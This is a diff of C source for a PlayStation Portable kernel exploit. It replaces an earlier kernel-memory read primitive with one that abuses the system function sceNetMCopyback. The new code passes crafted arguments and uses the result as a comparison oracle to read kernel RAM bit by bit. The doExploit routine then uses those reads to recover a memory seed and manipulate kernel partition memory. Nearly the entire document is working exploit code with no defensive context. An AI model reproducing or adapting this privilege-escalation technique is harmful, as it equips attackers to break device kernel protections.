@@ -33,8 +33,9 @@ Put together by Acid_Snake and meetpatty.
 
 #define FAKE_UID_OFFSET        0x80
 
-UserFunctions* g_tbl;
-int (*_sceNpCore_8AFAB4A0)(int *input, char *string, int length);
+UserFunctions* g_tbl = NULL;
+//int (*_sceNpCore_8AFAB4A0)(int *input, char *string, int length);
+void (*_sceNetMCopyback_1560F143)(uint32_t * a0, uint32_t a1, uint32_t a2, uint32_t a3);
 
 /* Actual code to trigger the kram read vulnerability.
     We can read the value stored at any location in Kram.
@@ -56,7 +57,7 @@ static int racer(SceSize args, void *argp) {
 
   return g_tbl->KernelExitDeleteThread(0);
 }
-u32 readKram(u32 addr){
+/*u32 readKram(u32 addr){
   SceUID thid = g_tbl->KernelCreateThread("", racer, 8, 0x1000, 0, NULL);
   if (thid < 0)
     return 0;
@@ -87,6 +88,60 @@ u32 readKram(u32 addr){
   running = 0;
   return 0;
 }
+*/
+int sceNetMCopyback_exploit_helper(uint32_t addr, uint32_t value, uint32_t seed) {
+	uint32_t a0[7];
+	a0[0] = addr - 12;
+	a0[3] = seed + 1; // (int)a0[3] must be < (int)a1
+	a0[4] = 0x20000; // a0[4] must be = 0x20000
+	a0[6] = seed; // (int)a0[6] must be < (int)a0[3]
+	uint32_t a1 = value + seed + 1;
+	uint32_t a2 = 0; // a2 must be <= 0
+	uint32_t a3 = 1; // a3 must be > 0
+	_sceNetMCopyback_1560F143(a0, a1, a2, a3);
+	return a0[6] != seed;
+}
+
+// input: 4-byte-aligned kernel address to a non-null positive 32-bit integer
+// return *addr >= value;
+int is_ge_pos(uint32_t addr, uint32_t value) {
+	return sceNetMCopyback_exploit_helper(addr, value, 0xFFFFFFFF);
+}
+
+// input: 4-byte-aligned kernel address to a non-null negative 32-bit integer
+// return *addr <= value;
+int is_le_neg(uint32_t addr, uint32_t value) {
+	return sceNetMCopyback_exploit_helper(addr, value, 0x80000000);
+}
+
+// input: 4-byte-aligned kernel address to a non-null 32-bit integer
+// return (int)*addr > 0
+int is_positive(uint32_t addr) {
+	return is_ge_pos(addr, 1);
+}
+u32 readKram(u32 addr) {
+	unsigned int res = 0;
+	int bit_idx = 1;
+	if (is_positive(addr)) {
+		for (; bit_idx < 32; bit_idx++) {
+			unsigned int value = res | (1 << (31 - bit_idx));
+			if (is_ge_pos(addr, value))
+				res = value;
+		}
+		return res;
+	}
+	res = 0x80000000;
+	for (; bit_idx < 32; bit_idx++) {
+		unsigned int value = res | (1 << (31 - bit_idx));
+		if (is_le_neg(addr, value))
+			res = value;
+	}
+	if (res == 0xFFFFFFFF)
+		res = 0;
+	return res;
+
+
+}
 
 void repairInstruction(KernelFunctions* k_tbl) {
   /*
@@ -105,7 +160,8 @@ int stubScanner(UserFunctions* tbl){
     g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON);
     g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON);
     g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);
-    _sceNpCore_8AFAB4A0 = tbl->FindImportUserRam("sceNpCore", 0x8AFAB4A0);
+    //_sceNpCore_8AFAB4A0 = tbl->FindImportUserRam("sceNpCore", 0x8AFAB4A0);
+	_sceNetMCopyback_1560F143 = tbl->FindImportUserRam("sceNetIfhandle_lib", 0x1560F143);
 
     return 0;
 }
@@ -120,12 +176,14 @@ int doExploit(void) {
     u32 seed = 0;
     u32 type_uid = TYPE_UID_OFFSET_360;
 
-    if (_sceNpCore_8AFAB4A0 != NULL){
+    //if (_sceNpCore_8AFAB4A0 != NULL){
+    if (_sceNetMCopyback_1560F143 != NULL){
       u32 test_val = readKram(SYSMEM_SEED_OFFSET_CHECK);
-      //PRTSTR1("test_val: %p", test_val);
+	  PRTSTR1("test_val: 0x%p", test_val);
       if (test_val == 0x8F154E38){
         seed = readKram(SYSMEM_SEED_OFFSET_365);
         libc_clock_offset = LIBC_CLOCK_OFFSET_365;
+	  	PRTSTR1("test_val: 0x%p", test_val);
       }
       else if (test_val == 0x8FBF003C){
         libc_clock_offset = LIBC_CLOCK_OFFSET_660;
@@ -133,16 +191,13 @@ int doExploit(void) {
       }
     }
 
-    g_tbl->KernelDcacheWritebackAll();
-
     // Allocate dummy block to improve reliability
     char dummy[32];
     memset(dummy, 'a', sizeof(dummy));
     SceUID dummyid;
-    for (int i=0; i<10; i++){
+    for (int i=0; i<10; i++)
       dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_High, 0x10, NULL);
-      g_tbl->KernelDcacheWritebackAll();
-    }
+      //g_tbl->KernelDcacheWritebackAll();
 
     // we can calculate the address of dummy block via its UID and from there calculate where the next block will be
     u32 dummyaddr = 0x88000000 + ((dummyid >> 5) & ~3);
@@ -160,6 +215,7 @@ int doExploit(void) {
     res = g_tbl->KernelFreePartitionMemory(uid);
 
     g_tbl->KernelDcacheWritebackAll();
+
    
     if (res < 0) return res;
 
